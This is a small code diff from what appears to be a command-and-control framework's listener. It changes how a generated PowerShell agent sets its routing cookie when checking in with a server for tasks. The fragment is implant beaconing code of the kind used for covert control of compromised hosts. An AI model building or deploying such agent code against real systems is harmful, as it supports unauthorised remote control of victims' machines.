@@ -773,7 +773,7 @@ class Listener(object):
                                 $script:Headers.GetEnumerator() | % {$""" + helpers.generate_random_script_var_name(
                     "wc") + """.Headers.Add($_.Name, $_.Value)}
                                 $""" + helpers.generate_random_script_var_name(
-                    "wc") + """.Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
+                    "wc") + """.Headers.Add("Cookie",\"""" + self.session_cookie + """session=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
